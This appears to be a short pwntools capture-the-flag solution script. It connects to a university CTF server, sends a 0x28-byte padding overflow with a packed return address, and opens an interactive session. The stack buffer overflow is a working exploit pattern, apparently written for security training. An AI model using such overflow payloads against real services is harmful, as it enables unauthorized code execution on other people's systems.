from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11001
p = remote(host, port)

print(p.recvline())

p.sendline(b"A"*0x28 + p64(0x040064d))

p.interactive()

